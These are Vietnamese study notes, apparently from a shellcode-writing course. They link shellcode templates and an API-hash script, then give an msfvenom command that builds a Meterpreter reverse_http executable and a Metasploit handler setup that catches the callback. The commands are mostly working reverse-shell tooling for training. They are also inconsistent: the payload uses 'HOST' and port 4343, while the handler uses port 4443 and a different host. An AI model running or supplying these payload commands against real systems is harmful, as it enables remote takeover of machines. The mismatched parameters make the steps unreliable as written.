# Bài 2:
[Các template các hàm](https://github.com/Cl0wnK1n9/ShellcodeTemplate-windowx86/tree/main/Functions)  

Để load DLL thì đổi sang ASCII sang hex (Lưu ý trong code viết bytes theo chiều ngược lại) \
Để load API thì tính hash: \
[Code tính hash tên các API](https://github.com/10u15hack1ng/x86Win-Notes/blob/main/Custom%20Shellcode/getAPIhash.py)

Để sinh payload bằng metasploit:
```
$ msfvenom -p windows/meterpreter/reverse_http HOST=192.168.45.178 LPORT=4343 -f exe -o met.exe
```

Để tạo listener trên máy kali khi thực thi shellcode:
```
# Exploit after met.exe execution
$ msfconsole
msf> use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_http
msf exploit(handler) > set LHOST consulting.example.org
msf exploit(handler) > set LPORT 4443
msf exploit(handler) > set SessionCommunicationTimeout 0
msf exploit(handler) > set ExitOnSession false
msf exploit(handler) > exploit -j
```

Tham khảo cách viết: [Shellcode trong sách](https://github.com/10u15hack1ng/x86Win-Notes/blob/main/Custom%20Shellcode/shellcode_NO_CHANGE_PLEASE.)
